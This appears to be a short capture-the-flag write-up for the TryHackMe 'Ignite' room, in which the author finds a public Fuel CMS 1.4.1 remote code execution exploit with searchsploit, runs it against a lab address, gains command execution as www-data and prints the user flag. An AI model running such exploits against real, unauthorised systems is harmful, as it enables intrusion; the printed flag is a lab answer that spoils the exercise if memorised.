

![[Pasted image 20251128125628.png]]

--Website is clearly giving us a version of the CMS system so I decided to look it up


┌──(kali㉿kali)-[~]
└─$ searchsploit fuel cms
---------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                            |  Path
---------------------------------------------------------------------------------------------------------- ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                                                                | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                                                | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                                                                | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                                               | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                                                      | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                                          | php/webapps/48778.txt
Fuel CMS 1.5.0 - Cross-Site Request Forgery (CSRF)                                                        | php/webapps/50884.txt
---------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ find / -name "50477.py" 2>/dev/null
/usr/share/exploitdb/exploits/php/webapps/50477.py
                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ cp /usr/share/exploitdb/exploits/php/webapps/50477.py ~/THM/Ignite

┌──(kali㉿kali)-[~/THM/Ignite]
└─$ python3 50477.py -u http://10.64.152.50
[+]Connecting...
Enter Command $id
systemuid=33(www-data) gid=33(www-data) groups=33(www-data)

--exploit DB pops off

Enter Command $cat /home/www-data/flag.txt
system6470e394cbf6dab6a91682cc8585059b 

--user flag found